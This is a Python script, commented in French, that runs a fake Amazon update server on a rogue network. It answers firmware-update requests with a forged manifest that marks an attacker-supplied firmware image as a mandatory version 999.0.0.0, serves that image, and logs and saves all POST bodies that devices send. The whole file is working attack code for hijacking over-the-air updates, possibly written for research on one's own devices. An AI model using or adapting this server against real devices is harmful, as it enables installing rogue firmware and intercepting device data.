#!/usr/bin/env python3
"""Faux serveur Amazon — intercepte OTA + artefacts sur HTTP et HTTPS."""
import http.server, ssl, json, os, sys, threading, time

LOG = "/tmp/fakeap/fake_amazon.log"
class FakeHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        with open(LOG, "a") as f:
            f.write("%s %s %s\n" % (time.strftime("%H:%M:%S"), self.command, self.path))

    def do_GET(self):
        self.log_message("GET %s", self.path)
        host = self.headers.get("Host", "")
        # Manifeste OTA : servir un manifeste qui pointe vers NOUS
        if "softwareupdates" in host or "update" in self.path.lower():
            manifest = {
                "updateManifestList": [{
                    "updateId": "fake-001",
                    "version": "999.0.0.0",
                    "url": "http://192.168.50.1:8080/our_firmware.bin",
                    "size": 9152512,
                    "sha256": "deadbeef",
                    "mandatory": True
                }]
            }
            body = json.dumps(manifest).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", len(body))
            self.end_headers()
            self.wfile.write(body)
        elif "our_firmware.bin" in self.path:
            # Servir notre boot.img
            try:
                data = open("/tmp/fakeap/our_firmware.bin", "rb").read()
            except:
                data = b"FAKE_FIRMWARE"
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", len(data))
            self.end_headers()
            self.wfile.write(data)
        else:
            self.send_response(404)
            self.send_header("Content-Length", 0)
            self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        self.log_message("POST %s (%d bytes)", self.path, length)
        with open("/tmp/fakeap/inject_post_%d.bin" % time.time(), "wb") as f:
            f.write(body)
        # Réponse générique
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')

port_http = 8080
port_https = 8443
httpd = http.server.HTTPServer(("0.0.0.0", port_http), FakeHandler)
print(f"Fake Amazon HTTP sur :{port_http}")
httpd.serve_forever()
